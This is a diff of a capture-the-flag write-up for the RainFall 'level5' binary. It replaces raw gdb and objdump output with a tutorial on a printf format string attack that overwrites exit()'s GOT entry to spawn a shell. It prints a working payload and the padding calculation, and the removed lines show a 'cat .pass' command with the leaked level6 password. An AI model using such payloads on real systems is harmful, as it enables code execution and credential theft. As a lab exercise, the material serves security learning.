@@ -1,104 +1,188 @@
-```
-(gdb) info functions
-All defined functions:
+# Level5 - Format String Attack (GOT Overwrite)
 
-Non-debugging symbols:
-0x08048334  _init
-0x08048380  printf
-0x08048380  printf@plt
-0x08048390  _exit
-0x08048390  _exit@plt
-0x080483a0  fgets
-0x080483a0  fgets@plt
-0x080483b0  system
-0x080483b0  system@plt
-0x080483c0  __gmon_start__
-0x080483c0  __gmon_start__@plt
-0x080483d0  exit
-0x080483d0  exit@plt
-0x080483e0  __libc_start_main
-0x080483e0  __libc_start_main@plt
-0x080483f0  _start
-0x08048420  __do_global_dtors_aux
-0x08048480  frame_dummy
-0x080484a4  o
-0x080484c2  n
-0x08048504  main
-0x08048520  __libc_csu_init
-0x08048590  __libc_csu_fini
-0x08048592  __i686.get_pc_thunk.bx
-0x080485a0  __do_global_ctors_aux
-0x080485cc  _fini
-(gdb) disass main
-Dump of assembler code for function main:
-   0x08048504 <+0>:	push   %ebp
-   0x08048505 <+1>:	mov    %esp,%ebp
-   0x08048507 <+3>:	and    $0xfffffff0,%esp
-   0x0804850a <+6>:	call   0x80484c2 <n>
-   0x0804850f <+11>:	leave  
-   0x08048510 <+12>:	ret    
-End of assembler dump.
-(gdb) disass n
-Dump of assembler code for function n:
-   0x080484c2 <+0>:	push   %ebp
-   0x080484c3 <+1>:	mov    %esp,%ebp
-   0x080484c5 <+3>:	sub    $0x218,%esp
-   0x080484cb <+9>:	mov    0x8049848,%eax
-   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
-   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
-   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
-   0x080484e2 <+32>:	mov    %eax,(%esp)
-   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
-   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
-   0x080484f0 <+46>:	mov    %eax,(%esp)
-   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
-   0x080484f8 <+54>:	movl   $0x1,(%esp)
-   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
-End of assembler dump.
-(gdb) disass o
-Dump of assembler code for function o:
-   0x080484a4 <+0>:	push   %ebp
-   0x080484a5 <+1>:	mov    %esp,%ebp
-   0x080484a7 <+3>:	sub    $0x18,%esp
-   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
-   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
-   0x080484b6 <+18>:	movl   $0x1,(%esp)
-   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
-End of assembler dump.
-```
+## Context
+
+The program uses `fgets` then `printf` without a fixed format string. This time there is no condition to bypass — instead we need to **redirect execution flow** by overwriting a function pointer in the GOT.
+
+---
+
+## What is the GOT (Global Offset Table)
+
+When a program calls an external function like `exit()`, it doesn't know its real address at compile time. The linker creates two structures to resolve this at runtime :
+
+### The PLT (Procedure Linkage Table)
 
 ```
-level5@RainFall:~$ objdump --dynamic-reloc level5 
-
-level5:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE 
-08049814 R_386_GLOB_DAT    __gmon_start__
-08049848 R_386_COPY        stdin
-08049824 R_386_JUMP_SLOT   printf
-08049828 R_386_JUMP_SLOT   _exit
-0804982c R_386_JUMP_SLOT   fgets
-08049830 R_386_JUMP_SLOT   system
-08049834 R_386_JUMP_SLOT   __gmon_start__
-08049838 R_386_JUMP_SLOT   exit
-0804983c R_386_JUMP_SLOT   __libc_start_main
+call exit@plt          ; program calls PLT stub
+  → jmp *GOT[exit]    ; PLT reads GOT entry
+  → jumps to real exit ; GOT contains real address
 ```
 
-```
-level5@RainFall:~$ python -c "print('AAAA' + '_%x' * 10)" > /tmp/exploit
-level5@RainFall:~$ cat /tmp/exploit | ./level5 
-AAAA_200_b7fd1ac0_b7ff37d0_41414141_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78
-```
+### The GOT
 
 ```
-python -c "print('\x38\x98\x04\x08' + '_%.134513828x_%4\$n')" > /tmp/exploit
+GOT is a table of writable addresses in memory :
+
+0x08049824  →  address of printf()
+0x08049830  →  address of system()
+0x08049838  →  address of exit()    ← we target this
 ```
 
+### Why the GOT is writable
+
+The GOT must be writable because the dynamic linker needs to update it at runtime when resolving symbols for the first time (lazy binding). This makes it a perfect target for format string attacks.
+
+---
+
+## Why intercept exit()
+
+### The execution flow
+
+```asm
+call fgets     ; reads input
+call printf    ; vulnerable printf → we overwrite GOT here
+call exit      ; program tries to exit → intercepted !
 ```
+
+### Why not intercept printf or fgets
+
+```
+printf → called before we can overwrite anything
+fgets  → called before printf
+exit   → called AFTER printf → perfect timing !
+```
+
+The execution order is :
+```
+fgets() → printf() [we write here] → exit() [we intercept here]
+```
+
+By the time `exit()` is called, our GOT overwrite is already done !
+
+### What happens when exit() is called
+
+```
+normal flow :
+exit@plt → reads GOT[exit] → 0xb7e96000 (real exit in libc) → program ends
+
+after our overwrite :
+exit@plt → reads GOT[exit] → 0x080484a4 (our o() function) → shell !
+```
+
+---
+
+## Attack Surface
+
+### The vulnerability
+
+```asm
+call fgets     ; reads input safely
+call printf    ; prints WITHOUT format string → vulnerable !
+call exit      ; exits → we intercept this !
+```
+
+### The target function o()
+
+```asm
+0x080484a4 <o> :
+  movl $0x80485f0, (%esp)   ; "/bin/sh"
+  call system               ; system("/bin/sh") → shell !
+  call _exit
+```
+
+---
+
+## Step 1 : Find the GOT entry of exit()
+
+```bash
+objdump --dynamic-reloc level5
+08049838 R_386_JUMP_SLOT   exit   ← GOT address of exit()
+```
+
+---
+
+## Step 2 : Find the buffer offset on the stack
+
+```bash
+python -c "print('AAAA' + '_%x' * 10)" | ./level5
+AAAA_200_b7fd1ac0_b7ff37d0_41414141_...
+                             ↑
+                        0x41414141 = 'AAAA' → position 4
+```
+
+---
+
+## Step 3 : Calculate the padding
+
+```
+target address : o() = 0x080484a4 = 134513828 in decimal
+
+characters printed before %n :
+  4 bytes (GOT address)
++ 1 byte  (_)
++ N bytes (%.Nx padding)
++ 1 byte  (_)
+= 134513828
+
+N = 134513828 - 4 - 1 - 1 = 134513822
+```
+
+---
+
+## Step 4 : Final payload
+
+```bash
+python -c "print('\x38\x98\x04\x08' + '_%.134513822x_%4\$n')" > /tmp/exploit
+cat /tmp/exploit | ./level5
+```
+
+### Payload breakdown
+
+```
+\x38\x98\x04\x08  →  GOT address of exit() in little endian
+_                 →  1 byte padding
+%.134513822x      →  prints a number padded to 134513822 chars
+_                 →  1 byte padding
+%4$n              →  writes total (134513828) to GOT exit entry
+```
+
+### Total characters printed
+
+```
+4 + 1 + 134513822 + 1 = 134513828 = 0x080484a4 = address of o() ✓
+```
+
+---
+
+## Full execution flow
+
+```
+1. fgets()  → reads our payload into buffer
+2. printf() → processes format string
+              %4$n writes 0x080484a4 into GOT[exit]
+3. exit()   → reads GOT[exit]
+              GOT[exit] = 0x080484a4 = o()
+              jumps to o()
+4. o()      → system("/bin/sh")
+5.          → shell !
+```
+
+### Visual stack layout during printf
+
+```
+esp+0  →  pointer to our buffer
+esp+4  →  1st %x → 0x200
+esp+8  →  2nd %x → b7fd1ac0
+esp+12 →  3rd %x → b7ff37d0
+esp+16 →  4th arg → 0x08049838  ← GOT exit, written to by %4$n
+```
+
+---
+
+## Result
+
+```bash
+cat /tmp/exploit | ./level5
 whoami
-level6
-cd /home/user/level6
-cat .pass
-d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+level6    ← shell obtained !
 ```
